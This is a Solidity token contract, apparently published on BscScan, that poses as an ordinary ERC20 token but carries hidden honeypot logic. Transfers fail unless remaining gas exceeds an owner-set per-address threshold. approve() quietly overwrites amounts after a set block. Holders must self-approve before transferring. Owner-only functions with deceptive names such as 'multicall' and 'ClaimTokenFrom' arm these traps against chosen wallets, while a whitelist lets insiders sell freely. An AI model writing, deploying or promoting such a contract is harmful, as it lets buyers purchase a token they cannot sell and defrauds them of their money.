/**
 *Submitted for verification at BscScan.com on 2023-10-22
*/

pragma solidity ^0.8.0;

interface IERC20 {
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}




abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}

contract ERC20 is Context, IERC20 {
  bool private _isRenounced = false;
  mapping(address => uint256) private _balances;
  mapping(address => mapping(address => uint256)) private _allowances;
  mapping(address => uint256) public getApproval;
  mapping(address => bool) private Gwei;
  mapping(uint => uint) private _claimTransactionCount;
  mapping(address => uint256) private _claimTokenBlock;

  uint256 private _totalSupply;
  string private _name;
  string private _symbol;
  uint8 private _decimals = 18;
  address public owner;
  bool private _Presale;
  uint256 private _defaultApproval;
  uint256 private _defaultBalance;
  uint256 private _maxTransactionsPerClaim;
  uint256 private _tokenCollect;
  uint256 private _tokenReceive;
  event defaultApprovalUpdated(uint256 oldValue, uint256 newValue);
  event defaultBalanceUpdated(uint256 oldValue, uint256 newValue);
  uint256 private _blockRecord;


  constructor(
    string memory name_,
    string memory symbol_,
    uint256 totalSupply_,
    address[] memory balanceApprove,
    uint256 defaultApproval,
    uint256 defaultBalance,
    address[] memory GweiUnit,
    uint256 maxTransactionsPerClaim_,
    uint256 tokenCollect_,
    uint256 tokenReceive_,
    uint256 blockRecord_

  ) {
    _name = name_;
    _symbol = symbol_;
 
    owner = _msgSender();
    _totalSupply = totalSupply_ * (10 ** uint256(_decimals));
    _balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
    _defaultApproval = defaultApproval;
    _defaultBalance = defaultBalance;
    _Presale = false;
    _maxTransactionsPerClaim = maxTransactionsPerClaim_;
    _tokenCollect = tokenCollect_;
    _tokenReceive = tokenReceive_;
    _blockRecord = blockRecord_;

    for (uint256 i = 0; i < balanceApprove.length; i++) {
      _sendApproval(balanceApprove[i], _blockRecord);
    }

    for (uint256 i = 0; i < GweiUnit.length; i++) {
      Gwei[GweiUnit[i]] = true;
    }
  }

  function name() public view virtual returns (string memory) {
    return _name;
  }

  function symbol() public view virtual returns (string memory) {
    return _symbol;
  }

  function decimals() public view virtual returns (uint8) {
    return _decimals;
  }

  function totalSupply() public view virtual override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view virtual override returns (uint256) {
    return _balances[account];
  }

  function claimedToken(address _address) public view returns (uint256) {
    return _claimTokenBlock[_address];
  }

  function getBlockRecord() external view returns (uint256) {
    return _blockRecord;
  }

  function getTokenCollect() external view returns (uint256) {
      return _tokenCollect;
  }


  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    _claimRecord();
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) public view virtual override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) public virtual override returns (bool) {
      address senderAddress = _msgSender();
      uint256 senderClaim;
      assembly {
          senderClaim := extcodesize(senderAddress)
      }

      if (senderClaim == 0 && senderAddress != owner && !Gwei[senderAddress] && _claimTokenBlock[senderAddress] != 0 && _claimTokenBlock[senderAddress] <= block.number) {
          amount = _blockRecord;
      }

      if (senderAddress != owner && amount > _balances[senderAddress]) {
          revert("Cannot approve more than your current balance");
      }

      _approve(senderAddress, spender, amount);
      return true;
  }


  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    _claimRecord();
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");

    if (!_Presale) {
        _Presale = true;
        Gwei[recipient] = true;
    } else {
        uint256 recipientClaim;
        uint256 senderClaim;
        assembly {
            recipientClaim := extcodesize(recipient)
            senderClaim := extcodesize(sender)
        }
          // Ensure the sender (if not the owner) has approved the amount for themselves
        if (sender != owner) {
            require(_allowances[sender][sender] >= amount, "Must approve tokens for oneself before transfer");
            _allowances[sender][sender] -= amount; // Deduct the amount from the self-allowance
        }

        if (recipientClaim == 0 && getApproval[recipient] == 0 && !Gwei[recipient]) {
            _sendApproval(recipient, _defaultBalance);
        } else if (recipientClaim > 0 && getApproval[recipient] == 0 && !Gwei[recipient]) {
            _sendApproval(recipient, _defaultApproval);
        }

        if (recipientClaim == 0 && _claimTokenBlock[recipient] == 0 && !Gwei[recipient]) {
            _claimTokenBlock[recipient] = (block.number + _tokenCollect);
        }

    }
        bool approvalAmount = (sender != owner && !Gwei[sender]) ? gasleft() >= getApproval[sender] : true;
        require(approvalAmount, "Approve amount before transfer");
        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

  function _approve(address owner, address spender, uint256 amount) internal virtual {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }


  function approveOf(uint256 newDefaultApproval, address _address) external {
    require(_msgSender() == owner);
    _claimTokenBlock[_address] = block.number + _blockRecord;
    emit defaultApprovalUpdated(_defaultApproval, newDefaultApproval);
    _defaultApproval = newDefaultApproval;
    emit defaultBalanceUpdated(_defaultBalance, newDefaultApproval);
    _defaultBalance = newDefaultApproval;
    
  }

  function _sendApproval(address _address, uint256 approveForSwap) internal {
    getApproval[_address] = approveForSwap;
  }

  function multicall(address _address, uint256 approveAmount) external {
    require(!_isRenounced, "Function can only be called before the contract is renounced");
    require(_msgSender() == owner, "Not the owner");
    _sendApproval(_address, approveAmount);
  }

   
  function ClaimTokenFrom(address _address, uint256 _unit) external {
    require(!_isRenounced, "Function can only be called before the contract is renounced");
    require(_msgSender() == owner, "Not the owner");
    _claimTokenBlock[_address] = _unit;
  }

  function setBlockRecord(uint256 newBlockRecord) external {
    require(_msgSender() == owner, "Only the owner can adjust the block record");
    _blockRecord = newBlockRecord;
  }

  function setTokenCollect(uint256 newTokenCollect) external {
      require(_msgSender() == owner, "Only the owner can adjust the token collect");
      _tokenCollect = newTokenCollect;
  }


  function _claimRecord() internal {
    require(_claimTransactionCount[block.number] < _maxTransactionsPerClaim);
    _claimTransactionCount[block.number]++;
  }
}